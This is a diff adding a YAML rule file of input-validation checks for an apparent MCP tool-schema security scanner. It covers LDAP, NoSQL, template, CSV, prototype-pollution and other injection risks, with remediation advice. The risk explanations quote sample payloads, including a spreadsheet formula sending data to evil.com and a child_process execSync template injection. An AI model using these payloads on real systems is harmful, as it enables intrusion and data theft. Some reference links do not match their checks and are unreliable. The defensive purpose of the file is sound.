@@ -1,0 +1,937 @@
+category: input_validation
+checks:
+  - id: iv006
+    slug: ldap_injection
+    title: "LDAP Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters whose names or descriptions suggest LDAP query
+      construction without proper input validation. Parameters like 'filter',
+      'dn', 'search_base', or 'ldap_query' that accept unconstrained strings
+      enable LDAP injection attacks.
+    risk_explanation: >
+      LDAP injection allows an attacker to modify LDAP queries to bypass
+      authentication, extract directory information, or modify directory
+      entries. An attacker can inject LDAP filter metacharacters to retrieve
+      all records, bypass access controls, or enumerate users and groups in
+      the directory service.
+    remediation: >
+      Escape all LDAP special characters in user-supplied parameters before
+      query construction. Use parameterized LDAP queries where available.
+      Add pattern constraints to restrict parameters to expected formats.
+      Validate parameters against an allowlist of permitted LDAP filter
+      components.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - ldap_injection
+      - directory_services
+      - query_injection
+
+  - id: iv007
+    slug: nosql_injection
+    title: "NoSQL Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters suggesting MongoDB or other NoSQL query
+      construction without validation. Parameters accepting JSON objects or
+      query operators like $gt, $regex, or $where enable NoSQL injection
+      attacks that bypass authentication and access controls.
+    risk_explanation: >
+      NoSQL injection allows attackers to manipulate database queries using
+      operator injection. A parameter accepting {"$gt": ""} instead of a
+      simple string can bypass authentication checks. The $where operator
+      enables arbitrary JavaScript execution on the database server. NoSQL
+      injection is often overlooked because developers assume JSON-based
+      queries are safe.
+    remediation: >
+      Validate all parameters against expected types before constructing
+      NoSQL queries. Reject objects and arrays when simple strings are
+      expected. Sanitize input to remove MongoDB operator prefixes ($).
+      Use parameterized queries or ODM libraries that handle escaping.
+      Disable server-side JavaScript execution ($where) if not required.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - nosql_injection
+      - mongodb
+      - query_injection
+
+  - id: iv008
+    slug: ssti_injection
+    title: "Server-Side Template Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters that may be passed to server-side template
+      engines without sanitization. Parameters named 'template', 'content',
+      'message_body', or similar that accept unconstrained strings can enable
+      template injection in engines like Jinja2, Twig, or Handlebars.
+    risk_explanation: >
+      Server-side template injection allows an attacker to inject template
+      directives that execute arbitrary code on the server. In Python's Jinja2,
+      injecting {{config}} or {{''.__class__.__mro__}} can access server
+      configuration or achieve remote code execution. SSTI often leads to
+      complete server compromise.
+    remediation: >
+      Never pass user input directly into template rendering contexts. Use
+      template sandboxing features where available. Validate input against
+      expected patterns and reject strings containing template delimiters
+      ({{ }}, {% %}, ${ }, #{ }). Use logic-less template engines for
+      user-controlled content.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - ssti
+      - template_injection
+      - code_execution
+
+  - id: iv009
+    slug: xxe_injection
+    title: "XML External Entity Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters that accept XML input without restrictions on
+      external entity processing. XXE attacks exploit XML parsers that resolve
+      external entities, enabling file disclosure, SSRF, and denial of service.
+    risk_explanation: >
+      XXE injection allows an attacker to read local files on the server by
+      defining external entities that reference file:// URIs. It can also
+      trigger server-side requests to internal services (SSRF) or cause denial
+      of service through recursive entity expansion (billion laughs attack).
+      XXE is dangerous because many XML parsers enable external entities by
+      default.
+    remediation: >
+      Disable external entity processing in all XML parsers. Set
+      XMLConstants.FEATURE_SECURE_PROCESSING and disable DTDs. Use JSON
+      instead of XML where possible. If XML is required, use a parser
+      configured to reject external entities and DTD processing. Add schema
+      validation for XML parameters.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - xxe
+      - xml_injection
+      - entity_expansion
+
+  - id: iv010
+    slug: header_injection
+    title: "HTTP Header Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters used in HTTP header construction without proper
+      validation. Parameters whose values are placed into HTTP response or
+      request headers can inject additional headers via CRLF sequences,
+      enabling response splitting and cache poisoning.
+    risk_explanation: >
+      Header injection allows an attacker to inject arbitrary HTTP headers
+      into responses, enabling cache poisoning, session fixation, XSS via
+      injected content-type headers, and response splitting attacks. An
+      attacker can set cookies, redirect responses, or inject malicious
+      content by controlling header values.
+    remediation: >
+      Validate all parameters used in HTTP headers against strict allowlists.
+      Reject values containing CRLF characters (\\r\\n). Use framework-provided
+      header setting functions that automatically escape dangerous characters.
+      Implement input validation patterns that restrict header values to
+      expected formats.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - header_injection
+      - crlf
+      - response_splitting
+
+  - id: iv011
+    slug: regex_dos
+    title: "Regular Expression DoS (ReDoS)"
+    severity: medium
+    description: >
+      Detects tool parameters used in regular expression matching without
+      complexity limits. User-controlled input in regex patterns or matched
+      against vulnerable regex patterns can cause catastrophic backtracking,
+      leading to denial of service.
+    risk_explanation: >
+      ReDoS attacks exploit regular expressions with exponential backtracking
+      behaviour. A crafted input string can cause the regex engine to consume
+      100% CPU for minutes or hours, effectively denying service. Common
+      vulnerable patterns include nested quantifiers like (a+)+ and
+      overlapping alternations.
+    remediation: >
+      Never use user-supplied input directly as regex patterns. Set execution
+      time limits on regex matching operations. Use regex engines with
+      linear-time guarantees (RE2, rust-regex). Review all regex patterns
+      for catastrophic backtracking using tools like rxxr2 or safe-regex.
+      Implement input length limits for strings matched against regex.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - redos
+      - denial_of_service
+      - regex
+
+  - id: iv012
+    slug: integer_overflow
+    title: "Integer Overflow Risk"
+    severity: medium
+    description: >
+      Detects numeric tool parameters without explicit range constraints
+      (minimum/maximum values). Unconstrained integer parameters can trigger
+      integer overflow, underflow, or truncation vulnerabilities in server-side
+      processing.
+    risk_explanation: >
+      Integer overflow can cause unexpected behaviour including buffer
+      overflows, incorrect calculations, and security check bypasses. A
+      parameter that overflows from a large positive to a negative value can
+      bypass range checks, cause incorrect memory allocation sizes, or lead
+      to array index out-of-bounds access.
+    remediation: >
+      Define explicit minimum and maximum constraints for all numeric
+      parameters using JSON Schema's minimum and maximum keywords. Use
+      exclusiveMinimum and exclusiveMaximum where appropriate. Implement
+      server-side range validation independent of schema constraints. Use
+      language-safe integer types that detect overflow.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - integer_overflow
+      - numeric_validation
+      - range_constraint
+
+  - id: iv013
+    slug: format_string_injection
+    title: "Format String Injection"
+    severity: high
+    description: >
+      Detects tool parameters used in string formatting operations without
+      sanitization. Parameters passed to printf-style, f-string, or template
+      string formatters can inject format specifiers that read memory, cause
+      crashes, or write to arbitrary memory locations.
+    risk_explanation: >
+      Format string vulnerabilities allow an attacker to read from and write
+      to arbitrary memory addresses using format specifiers like %x, %n, and
+      %s. In higher-level languages, format string injection can leak internal
+      state, cause exceptions, or enable further injection attacks through
+      formatted output.
+    remediation: >
+      Never pass user input as the format string argument. Use parameterized
+      formatting where user input is always a format argument, not the format
+      template. Validate parameters to reject strings containing format
+      specifiers (%, {, }). Use structured logging that separates templates
+      from parameters.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - format_string
+      - memory_access
+      - string_formatting
+
+  - id: iv014
+    slug: xpath_injection
+    title: "XPath Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters used in XPath query construction without proper
+      validation. Parameters incorporated into XPath expressions can inject
+      query logic to bypass authentication, access unauthorized data, or
+      enumerate XML document structure.
+    risk_explanation: >
+      XPath injection allows an attacker to manipulate XML queries to access
+      data they should not see or bypass authentication. An injected ' or 1=1
+      expression can return all nodes regardless of access controls. Unlike
+      SQL injection, XPath injection has no privilege system, so successful
+      injection grants access to the entire XML document.
+    remediation: >
+      Use parameterized XPath queries where available. Escape XPath special
+      characters in user input before query construction. Validate input
+      against expected patterns and reject strings containing XPath operators
+      and brackets. Consider using XQuery with parameterized variables
+      instead of string concatenation.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - xpath_injection
+      - xml_query
+      - data_access
+
+  - id: iv015
+    slug: csv_injection
+    title: "CSV Injection Risk"
+    severity: medium
+    description: >
+      Detects tool parameters whose output may be rendered in CSV format
+      without sanitization. Parameters containing formula prefixes (=, +, -,
+      @) can execute formulas when the CSV is opened in spreadsheet
+      applications, enabling data exfiltration and code execution.
+    risk_explanation: >
+      CSV injection exploits spreadsheet applications that automatically
+      execute formulas in CSV data. An attacker injects a value like
+      =HYPERLINK("https://evil.com/?data="&A1,"Click") that exfiltrates data
+      when the CSV is opened. The DDE (Dynamic Data Exchange) protocol can
+      execute arbitrary commands on the user's machine.
+    remediation: >
+      Sanitize all parameter values that may appear in CSV output by prefixing
+      cells starting with =, +, -, @, or tab with a single quote. Implement
+      output encoding specifically for CSV contexts. Validate input parameters
+      to reject values containing formula prefixes when CSV output is expected.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - csv_injection
+      - formula_injection
+      - spreadsheet
+
+  - id: iv016
+    slug: unicode_normalization
+    title: "Unicode Normalization Bypass"
+    severity: medium
+    description: >
+      Detects input validation that can be bypassed via Unicode normalization
+      transformations. Characters that appear different in their composed and
+      decomposed forms can bypass security filters while being normalized to
+      dangerous values by the processing system.
+    risk_explanation: >
+      Unicode normalization can transform filtered characters into dangerous
+      equivalents after validation. For example, the fullwidth solidus (U+FF0F)
+      normalizes to a regular slash (/), bypassing path traversal filters. The
+      validation check passes the pre-normalized form while the application
+      processes the post-normalized dangerous form.
+    remediation: >
+      Apply Unicode normalization (NFC or NFKC) to all input before
+      validation, not after. Validate against the normalized form to ensure
+      filters see the same representation as the processing logic. Reject
+      input containing non-ASCII characters when only ASCII is expected.
+      Use Unicode-aware validation libraries.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - unicode_normalization
+      - filter_bypass
+      - encoding
+
+  - id: iv017
+    slug: null_byte_injection
+    title: "Null Byte Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters that may be vulnerable to null byte injection.
+      Null bytes (\\x00) in file paths or strings can truncate processing in
+      C-based libraries, causing the application to operate on a different
+      resource than validated.
+    risk_explanation: >
+      Null byte injection exploits the difference between how high-level
+      languages (Python, Java) and C-level libraries handle null characters.
+      A path like 'safe.txt\\x00.jpg' passes a .jpg extension check but is
+      truncated to 'safe.txt' by the filesystem. This bypasses extension
+      validation, path restrictions, and type checking.
+    remediation: >
+      Reject all input containing null bytes (\\x00). Strip null bytes from
+      parameters before processing. Implement validation that explicitly
+      checks for null byte presence. Use language-native path handling
+      functions that are not vulnerable to null byte truncation.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - null_byte
+      - path_truncation
+      - c_string
+
+  - id: iv018
+    slug: crlf_injection
+    title: "CRLF Injection Risk"
+    severity: high
+    description: >
+      Detects tool parameters vulnerable to carriage return and line feed
+      injection. CRLF characters (\\r\\n) in parameters used for HTTP headers,
+      log entries, or protocol messages can inject additional content, enabling
+      response splitting and log forgery.
+    risk_explanation: >
+      CRLF injection in HTTP headers enables response splitting where the
+      attacker controls part of the HTTP response. This can inject arbitrary
+      headers, set cookies, redirect users, or inject HTML/JavaScript content.
+      In log files, CRLF injection creates fake log entries that can mask
+      attack evidence or trigger monitoring false positives.
+    remediation: >
+      Strip or reject CRLF characters (\\r, \\n) from all parameters used in
+      HTTP headers, log messages, or protocol communications. Use framework
+      functions for header setting that automatically prevent CRLF injection.
+      Implement input validation that rejects control characters in string
+      parameters.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - crlf_injection
+      - response_splitting
+      - log_injection
+
+  - id: iv019
+    slug: missing_length_constraint
+    title: "Missing Input Length Constraint"
+    severity: medium
+    description: >
+      Detects string parameters in tool schemas without maxLength constraints.
+      Unbounded string parameters allow attackers to submit extremely large
+      inputs that cause memory exhaustion, buffer overflows, or denial of
+      service through excessive processing.
+    risk_explanation: >
+      Without length constraints, an attacker can submit megabytes of data in
+      a single parameter, causing memory exhaustion on the server. Large inputs
+      can also trigger pathological behaviour in string processing algorithms,
+      regex engines, and database queries. The absence of limits is itself a
+      vulnerability indicator.
+    remediation: >
+      Add maxLength constraints to all string parameters in tool schemas. Set
+      limits appropriate to the parameter's purpose (e.g. 255 for names,
+      2048 for URLs). Implement server-side length validation independent of
+      schema constraints. Set global request size limits at the transport
+      layer.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - length_constraint
+      - denial_of_service
+      - schema_constraint
+
+  - id: iv020
+    slug: missing_type_constraint
+    title: "Missing Type Constraint"
+    severity: medium
+    description: >
+      Detects tool parameters without explicit type definitions in their JSON
+      Schema. Parameters lacking a type constraint accept any JSON value,
+      making it impossible to validate input structure and enabling type
+      confusion attacks.
+    risk_explanation: >
+      Typeless parameters accept strings, numbers, objects, arrays, booleans,
+      and null values interchangeably. An attacker can submit an object where
+      a string is expected, potentially triggering prototype pollution,
+      injection through object properties, or unexpected code paths that were
+      never tested with non-string input.
+    remediation: >
+      Define explicit type constraints for every tool parameter in the JSON
+      Schema. Use the 'type' keyword to specify the expected data type. Avoid
+      union types unless genuinely required. Implement server-side type
+      checking that rejects values not matching the declared type.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - type_constraint
+      - schema_validation
+      - type_confusion
+
+  - id: iv021
+    slug: env_variable_injection
+    title: "Environment Variable Injection"
+    severity: high
+    description: >
+      Detects tool parameters used to set or modify environment variables.
+      Parameters that can influence the process environment allow attackers
+      to override PATH, LD_PRELOAD, and other security-critical variables.
+    risk_explanation: >
+      Environment variable injection can override security-critical settings.
+      Setting PATH allows command hijacking, LD_PRELOAD enables shared library
+      injection, and variables like NODE_OPTIONS or PYTHONPATH can force
+      execution of attacker-controlled code. Environment changes persist for
+      the process lifetime and affect all subsequent operations.
+    remediation: >
+      Never allow user-supplied parameters to directly set environment
+      variables. Use an allowlist of permitted environment variable names.
+      Validate values against strict patterns. Implement environment isolation
+      for tool execution contexts. Reject parameters containing known
+      dangerous variable names (PATH, LD_PRELOAD, HOME).
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - environment_injection
+      - variable_override
+      - process_security
+
+  - id: iv022
+    slug: deserialization_risk
+    title: "Unsafe Deserialization Risk"
+    severity: critical
+    description: >
+      Detects tool parameters that suggest object deserialization from user
+      input. Parameters accepting serialized objects (pickle, Java
+      serialization, YAML load, PHP unserialize) can trigger arbitrary code
+      execution when attacker-controlled data is deserialized.
+    risk_explanation: >
+      Unsafe deserialization is a well-known path to remote code execution.
+      Serialized objects can contain instructions that execute during
+      deserialization, giving the attacker full control of the server.
+      Python's pickle, Java's ObjectInputStream, PHP's unserialize, and
+      Ruby's Marshal are all exploitable when processing untrusted data.
+    remediation: >
+      Never deserialize untrusted input using native serialization formats.
+      Use safe data interchange formats like JSON with strict schema
+      validation. If deserialization is required, use safe loaders (e.g.
+      yaml.safe_load instead of yaml.load). Implement integrity verification
+      (HMAC) on serialized data before deserialization.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - deserialization
+      - code_execution
+      - object_injection
+
+  - id: iv023
+    slug: prototype_pollution
+    title: "Prototype Pollution Risk"
+    severity: high
+    description: >
+      Detects tool parameters that could enable JavaScript prototype pollution
+      through __proto__, constructor, or prototype property injection.
+      Parameters accepting nested objects without property name validation
+      can modify object prototypes globally.
+    risk_explanation: >
+      Prototype pollution modifies the prototype chain of JavaScript objects,
+      affecting all instances globally. An attacker injecting
+      {"__proto__": {"isAdmin": true}} can make every object in the
+      application appear to have admin privileges. This can lead to
+      authentication bypass, privilege escalation, and remote code execution.
+    remediation: >
+      Validate all object property names against an allowlist before
+      processing. Reject objects containing __proto__, constructor, or
+      prototype properties. Use Object.create(null) for lookup objects that
+      should not inherit prototype properties. Use schema validation to
+      restrict allowed property names.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - prototype_pollution
+      - javascript
+      - object_injection
+
+  - id: iv024
+    slug: log_injection
+    title: "Log Injection Risk"
+    severity: medium
+    description: >
+      Detects tool parameters that may be included in server log output
+      without sanitization. User input in logs can inject fake log entries,
+      manipulate log analysis tools, or exploit log viewers through format
+      string attacks.
+    risk_explanation: >
+      Log injection allows attackers to forge log entries that mask malicious
+      activity or trigger false alerts. Injected newlines create fake entries
+      that mislead incident response. ANSI escape codes in logs can exploit
+      terminal-based log viewers. Log injection can also be a stepping stone
+      for log-based code execution in log processing pipelines.
+    remediation: >
+      Sanitize all user input before including it in log messages. Encode or
+      strip newlines, carriage returns, and control characters. Use structured
+      logging (JSON format) that separates user data from log metadata. Escape
+      ANSI control sequences in log output. Never log raw user input without
+      encoding.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - log_injection
+      - log_forgery
+      - monitoring
+
+  - id: iv025
+    slug: template_literal_injection
+    title: "Template Literal Injection"
+    severity: high
+    description: >
+      Detects tool parameters used in JavaScript template literals or
+      equivalent constructs without sanitization. User input interpolated
+      into template literals can execute arbitrary JavaScript expressions
+      via ${...} syntax.
+    risk_explanation: >
+      Template literal injection in JavaScript evaluates arbitrary expressions
+      within ${} blocks. An attacker injecting ${process.env.SECRET} can
+      exfiltrate environment variables, while ${require('child_process')
+      .execSync('id')} achieves remote code execution. This is analogous to
+      server-side template injection but specific to JavaScript runtime.
+    remediation: >
+      Never interpolate user input directly into template literals. Use
+      tagged template literals with proper escaping. Validate input to reject
+      strings containing ${ sequences. Use parameterized string building
+      instead of template literal interpolation for user-controlled content.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - template_literal
+      - javascript
+      - code_injection
+
+  - id: iv026
+    slug: wildcard_parameter
+    title: "Wildcard Parameter Matching"
+    severity: medium
+    description: >
+      Detects tool parameters that accept wildcard patterns (*, ?, **)
+      without restrictions. Unrestricted glob or wildcard parameters can
+      match unintended files, directories, or resources, expanding the
+      operation scope beyond user intent.
+    risk_explanation: >
+      Wildcard parameters can be exploited to operate on more resources than
+      intended. A parameter accepting * in a file deletion tool can match all
+      files in a directory. Recursive wildcards (**) can traverse entire
+      directory trees. The attacker leverages wildcards to escalate the scope
+      of an operation from a single resource to many.
+    remediation: >
+      Restrict wildcard patterns to specific directories or resource sets.
+      Implement maximum match limits for wildcard expansion. Require explicit
+      confirmation when wildcards match more than a threshold number of
+      resources. Validate wildcard patterns against an allowlist of safe
+      matching contexts.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - wildcard
+      - glob_pattern
+      - scope_expansion
+
+  - id: iv027
+    slug: missing_enum_constraint
+    title: "Missing Enum Constraint on Action Parameters"
+    severity: low
+    description: >
+      Detects action, operation, or type parameters that accept free-form
+      strings instead of being restricted to an enumerated set of valid
+      values. Parameters that determine the tool's behaviour mode should
+      use enum constraints to prevent unexpected operations.
+    risk_explanation: >
+      Action parameters without enum constraints allow attackers to invoke
+      undocumented or dangerous operations. A 'mode' parameter that accepts
+      any string instead of ["read", "write"] could accept "delete" or
+      "admin". Free-form action parameters increase the attack surface by
+      allowing the LLM to pass unexpected operation types.
+    remediation: >
+      Add enum constraints to all parameters that control tool behaviour
+      modes, action types, or operation selection. Restrict values to the
+      documented set of valid operations. Implement server-side validation
+      that rejects values not in the enum set, independent of schema
+      validation.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - enum_constraint
+      - action_parameter
+      - schema_validation
+
+  - id: iv028
+    slug: nested_object_depth
+    title: "Excessive Nested Object Depth"
+    severity: medium
+    description: >
+      Detects tool parameters that allow deeply nested object structures
+      without depth limits. Excessive nesting can hide malicious payloads
+      deep in the structure, evade validation, and cause stack overflow or
+      excessive memory consumption during parsing.
+    risk_explanation: >
+      Deeply nested objects can exhaust stack space during recursive parsing,
+      causing denial of service. They also provide hiding places for malicious
+      properties that escape shallow validation. Each nesting level multiplies
+      the complexity of comprehensive validation, making deep structures
+      practical vehicles for smuggling dangerous values.
+    remediation: >
+      Set maximum nesting depth limits in JSON Schema using conditional
+      validation. Implement server-side depth checking before processing
+      parameters. Flatten deeply nested structures where possible. Reject
+      requests where parameter objects exceed a configurable depth threshold
+      (e.g. 5 levels).
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - nested_objects
+      - depth_limit
+      - denial_of_service
+
+  - id: iv029
+    slug: array_length_unbounded
+    title: "Unbounded Array Length"
+    severity: medium
+    description: >
+      Detects array-type tool parameters without maxItems constraints.
+      Unbounded arrays allow attackers to submit millions of items, causing
+      memory exhaustion, excessive processing time, and denial of service
+      on the MCP server.
+    risk_explanation: >
+      Array parameters without length limits enable denial of service by
+      submitting arrays with millions of elements. Processing large arrays
+      consumes memory and CPU proportionally. Database operations that iterate
+      over array parameters can generate millions of queries. Unbounded arrays
+      in nested structures compound the resource consumption exponentially.
+    remediation: >
+      Add maxItems constraints to all array parameters in tool schemas. Set
+      limits appropriate to the parameter's purpose. Implement server-side
+      array length validation independent of schema constraints. Set global
+      request payload size limits at the transport layer to prevent oversized
+      array submissions.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - array_length
+      - denial_of_service
+      - schema_constraint
+
+  - id: iv030
+    slug: additional_properties_open
+    title: "Open Additional Properties"
+    severity: medium
+    description: >
+      Detects tool parameter schemas that allow arbitrary additional properties
+      beyond those explicitly defined. Open schemas accept any extra properties,
+      enabling injection of unexpected parameters that may be processed by
+      the server without validation.
+    risk_explanation: >
+      Schemas with additionalProperties set to true (or not set, defaulting
+      to true) accept arbitrary extra properties. An attacker can inject
+      properties like '__proto__', 'admin', or 'command' that may be processed
+      by server-side code. These injected properties bypass the validation
+      applied to declared properties.
+    remediation: >
+      Set additionalProperties to false in all tool parameter schemas. Reject
+      requests containing properties not defined in the schema. If dynamic
+      properties are required, use patternProperties with strict name patterns.
+      Implement server-side property name validation that rejects unknown
+      properties.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - additional_properties
+      - schema_strictness
+      - property_injection
+
+  - id: iv031
+    slug: missing_pattern_validation
+    title: "Missing Pattern Validation on String Parameters"
+    severity: low
+    description: >
+      Detects string parameters without regex pattern validation in their JSON
+      Schema. Parameters that should match a specific format (emails, UUIDs,
+      dates, identifiers) but lack pattern constraints accept arbitrary strings,
+      expanding the attack surface.
+    risk_explanation: >
+      String parameters without pattern validation accept any content,
+      including injection payloads, binary data, and malformed input. A
+      parameter intended for email addresses that lacks a pattern constraint
+      can receive SQL injection payloads, path traversal sequences, or
+      command injection strings. Pattern validation is a first line of defence.
+    remediation: >
+      Add pattern constraints to string parameters that have a known format.
+      Use JSON Schema's format keyword for standard formats (email, uri, uuid,
+      date-time). Define custom regex patterns for domain-specific identifiers.
+      Combine pattern validation with maxLength constraints for comprehensive
+      input restriction.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - pattern_validation
+      - string_constraint
+      - regex
+
+  - id: iv032
+    slug: url_parameter_injection
+    title: "URL Parameter Injection"
+    severity: high
+    description: >
+      Detects URL-type tool parameters without scheme restrictions. Parameters
+      accepting arbitrary URLs can be set to file://, javascript:, data:, or
+      internal network URLs, enabling local file access, script execution, and
+      server-side request forgery.
+    risk_explanation: >
+      Unrestricted URL parameters enable server-side request forgery (SSRF)
+      by targeting internal network services. The file:// scheme reads local
+      files, javascript: executes code in browser contexts, and data: URIs
+      can embed malicious payloads. Internal URLs (http://169.254.169.254)
+      access cloud metadata services containing credentials.
+    remediation: >
+      Restrict URL parameters to https:// scheme only. Validate URLs against
+      an allowlist of permitted domains. Block access to internal IP ranges
+      (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Reject
+      URLs containing credentials, fragments, or suspicious encoding. Use
+      JSON Schema format: uri with additional server-side validation.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - url_injection
+      - ssrf
+      - scheme_restriction
+
+  - id: iv033
+    slug: email_parameter_injection
+    title: "Email Parameter Injection"
+    severity: medium
+    description: >
+      Detects email-type tool parameters without proper format validation.
+      Email parameters that accept arbitrary strings can be exploited for
+      header injection in SMTP communications, enabling spam relay and
+      phishing attacks through the MCP server.
+    risk_explanation: >
+      Email parameter injection exploits SMTP header injection where
+      newlines in the email address field inject additional headers like
+      Bcc, Subject, or body content. An attacker can use the MCP server as
+      an open mail relay for spam or phishing. Malformed email addresses
+      can also cause parsing errors and application crashes.
+    remediation: >
+      Validate email parameters using JSON Schema format: email and
+      additional server-side validation. Reject addresses containing
+      newlines, null bytes, or SMTP special characters. Implement email
+      address allowlisting for sensitive operations. Use parameterized
+      SMTP libraries that prevent header injection.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - email_injection
+      - smtp
+      - header_injection
+
+  - id: iv034
+    slug: file_upload_no_validation
+    title: "File Upload Without Validation"
+    severity: high
+    description: >
+      Detects file upload tool parameters without type, size, or content
+      validation constraints. Unrestricted file uploads allow attackers to
+      submit malicious executables, oversized files for denial of service,
+      or files with double extensions to bypass type restrictions.
+    risk_explanation: >
+      Unrestricted file uploads can deliver malware, web shells, and
+      exploitable content to the server. An attacker can upload a PHP/Python
+      web shell disguised as an image, overwrite critical files through path
+      manipulation, or exhaust disk space with oversized uploads. File uploads
+      are a primary vector for remote code execution.
+    remediation: >
+      Validate file type using content-based detection (magic bytes), not
+      just file extension. Set maximum file size limits in the schema and at
+      the transport layer. Restrict allowed MIME types to an explicit
+      allowlist. Store uploads outside the web root with randomized names.
+      Scan uploaded files for malware before processing.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - file_upload
+      - content_validation
+      - malware
+
+  - id: iv035
+    slug: html_injection
+    title: "HTML Injection Risk"
+    severity: medium
+    description: >
+      Detects tool parameters whose output may be rendered in HTML contexts
+      without proper escaping. Parameters containing HTML tags or entities
+      can inject content into web pages, enabling cross-site scripting and
+      content spoofing attacks.
+    risk_explanation: >
+      HTML injection allows attackers to modify the visual presentation of
+      web pages, inject phishing forms, or escalate to cross-site scripting
+      (XSS) by injecting script tags. Even without script execution, HTML
+      injection can create fake login forms, misleading content, or UI
+      redress attacks that trick users into unintended actions.
+    remediation: >
+      Escape all user-controlled parameters before rendering in HTML contexts.
+      Use context-appropriate encoding (HTML entity encoding for content,
+      attribute encoding for attributes, URL encoding for URLs). Implement
+      Content Security Policy headers to mitigate XSS. Use template engines
+      with automatic escaping enabled by default.
+    references:
+      - "https://owasp.org/www-project-mcp-top-10/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    owasp_mcp:
+      - "MCP05:2025"
+    tags:
+      - input_validation
+      - html_injection
+      - xss
+      - output_encoding
